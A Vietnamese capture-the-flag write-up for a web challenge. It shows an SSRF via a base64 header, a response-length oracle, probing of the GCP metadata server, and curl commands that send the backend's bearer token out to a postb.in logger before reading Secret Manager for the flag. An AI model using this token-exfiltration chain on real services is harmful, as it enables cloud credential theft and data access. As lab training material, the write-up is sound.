---
title: Cloudy with a Chance of Spaceships
date: 2026-10-01
ctf: CSS CTF
category: web
difficulty: medium
tags:
  - Web
  - SSRF
  - Length Oracle
  - GCP
  - Metadata
  - Secret Manager
---

## Đề bài
What's your forecast looking like?

http://34.116.80.78:9143/

## Solution
Truy cập vào challenge, ta thấy một trang SvelteKit cho xem "nhiệt độ vỏ tàu" (hull temperature) của một hạm đội tàu vũ trụ:

![image](./01-home.png)

Bấm vào tên một con tàu thì trang hiện ra nhiệt độ của nó:

> *The fleet lives in the cloud now. Every craft phones home to the ground station to report how it's doing.*

Câu "the fleet lives in the **cloud**" là một gợi ý rất đậm — ta cứ ghi nhớ đã.

Mở DevTools tab Network, bấm một con tàu, ta thấy request:

```http!
GET /api/v1/ship/Voyager%201/temperature
X-Resolver: XeyJyZXNvbHZlciI6Imh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1NwYWNlX3dlYXRoZXIifQ==
```

Có một header lạ `X-Resolver`. Giá trị trông như base64 nhưng dính chữ `X` ở đầu. Bỏ ký tự `X` đó rồi base64-decode, ta có:

```json!
{"resolver":"https://en.wikipedia.org/wiki/Space_weather"}
```

Soi đoạn client JS (file `_app/immutable/.../*.js`) để xác nhận cách header được tạo, ta thấy đoạn cần lưu ý:

```javascript!
async function T(a, t, e) {
  const r = a.currentTarget.textContent;
  ot(t, { ship: r }, !0);
  C(t).temp = await (await fetch(
    `/api/v1/ship/${encodeURIComponent(r)}/temperature`,
    { headers: { "X-Resolver": e } }
  )).text();
}
```

Nghĩa là backend sẽ **đi fetch cái URL nằm trong field `resolver`** mà ta hoàn toàn kiểm soát. Đây chính là `SSRF` kinh điển.

-> Format header: `"X" + base64(JSON {"resolver": "<URL ta chọn>"})`.

### "Nhiệt độ" thật ra là length oracle

![image](./02-reading.png)

Vấn đề: server fetch URL của ta nhưng **không trả về nội dung** — nó chỉ trả về một con số "nhiệt độ" như `3604.5°C` ở trên. Vậy con số đó từ đâu ra? Ta thử trỏ `resolver` vào vài URL có độ dài body biết trước:

| resolver | trả về |
|---|---|
| `httpbin.org/bytes/100` | `10` |
| `httpbin.org/bytes/537` | `53.7` |
| body `"42"` (2 byte) | `0.2` |

-> `temperature = len(body) / 10`. Ta chỉ đọc được **độ dài** của response, không đọc được nội dung. Đây là một `length oracle`.

### Vậy SSRF này trỏ đi đâu được?

Gợi ý "cloud" + server chạy trên GCP (IP `34.116.80.78` thuộc dải Google Cloud) khiến ta nghĩ ngay tới [GCP metadata server](https://cloud.google.com/compute/docs/metadata/overview). Ta thử:

```json!
{"resolver":"http://metadata.google.internal/computeMetadata/v1/project/project-id"}
```

May mắn thay, request `200 OK` — SSRF **chạm được** vào metadata nội bộ. Nhưng đây mới là lúc gặp mấy con đường vòng.

:::warning
**Những ngõ cụt đã thử:**

1. Endpoint ngon nhất — token của service account tại `.../instance/service-accounts/default/token` — bắt buộc phải có header `Metadata-Flavor: Google`. Ta thử nhét thêm field `headers` vào JSON `X-Resolver`, nhưng test bằng `httpbin.org/headers` thì độ dài response **không đổi** → backend **không forward** header ta khai báo. CRLF-inject để tự chèn header, hay dùng legacy path `/v1beta1`, `/0.1` đều fail.
2. Metadata chỉ đọc được những path không cần header (`/`, `/computeMetadata/`) → vô dụng.
:::

### Twist: backend tự đính kèm credential của chính nó

Vì không tự gửi được `Authorization`, ta thử một hướng khác: trỏ `resolver` vào một endpoint phản ứng khác nhau tuỳ có hay không có token. `https://httpbin.org/bearer` trả `401` rỗng nếu thiếu `Authorization`, trả `200` + JSON nếu có.

```json!
{"resolver":"https://httpbin.org/bearer"}
```

Backend nhận về **1068 byte** (nhiệt độ ~`106.8`) — tức là có body JSON dài. Vậy **backend tự nó đã đính kèm `Authorization: Bearer <token>`** vào mọi request outbound (~1030 ký tự token). Ta không cần tự gửi token — server tự "khoe" nó ra rồi!

-> Giờ chỉ cần làm server fetch tới **máy chủ của ta** để bắt lại cái token đó.

### Exfil token qua request-logger

Egress mở ra internet, nhưng `webhook.site`, `requestcatcher`, `oast.pro`, `hookb.in`, `pipedream`... đều bị chặn. Ta dùng `postb.in`.

:::info
**Bẫy quan trọng:** sink nào trả về redirect cross-host (vd `toptal.com` → `postb.in`) sẽ khiến thư viện `node-fetch` của backend **drop header `Authorization`** khi đi qua redirect. Nên ta phải trỏ **thẳng** vào host không redirect.
:::

```bash!
# tạo bin hứng request
BIN=$(curl -s -X POST https://www.postb.in/api/bin | jq -r .binId)

# dựng header X-Resolver trỏ thẳng vào bin
R='{"resolver":"https://www.postb.in/'"$BIN"'"}'
H="X$(printf '%s' "$R" | base64 -w0)"

# kích hoạt SSRF
curl -s "http://34.116.80.78:9143/api/v1/ship/Voyager%201/temperature" \
  -H "X-Resolver: $H"

# đọc request backend vừa gửi tới
curl -s "https://www.postb.in/api/bin/$BIN/req/shift" | jq .headers
```

Trong request bắt được có:

```json!
"authorization": "Bearer ya29.c.c0AZ4bNpbP..."
```

Kiểm tra `tokeninfo` xác nhận token này có scope `cloud-platform` — tức là một chiếc chìa khoá vạn năng cho cả project GCP.

### Pivot vào GCP → flag

Dùng token như một client GCP bình thường:

```bash!
A="Authorization: Bearer $TOK"

# 1) Resource Manager bị disable, nhưng lỗi 403 lộ project number
curl -s -H "$A" https://cloudresourcemanager.googleapis.com/v1/projects
# -> project number: 613713115850

# 2) Lỗi GCS cũng lộ service account đang dùng:
#    meteorologist@css-ctf-2026.iam.gserviceaccount.com

# 3) Liệt kê secret trong Secret Manager
curl -s -H "$A" \
  https://secretmanager.googleapis.com/v1/projects/613713115850/secrets
# -> goog_encryption_secret

# 4) Đọc nội dung secret
curl -s -H "$A" \
  "https://secretmanager.googleapis.com/v1/projects/613713115850/secrets/goog_encryption_secret/versions/latest:access" \
  | jq -r .payload.data | base64 -d
```

```
CSSCTF{your_forecast_says_love_is_on_its_way}
```

-> Flag: `CSSCTF{your_forecast_says_love_is_on_its_way}`
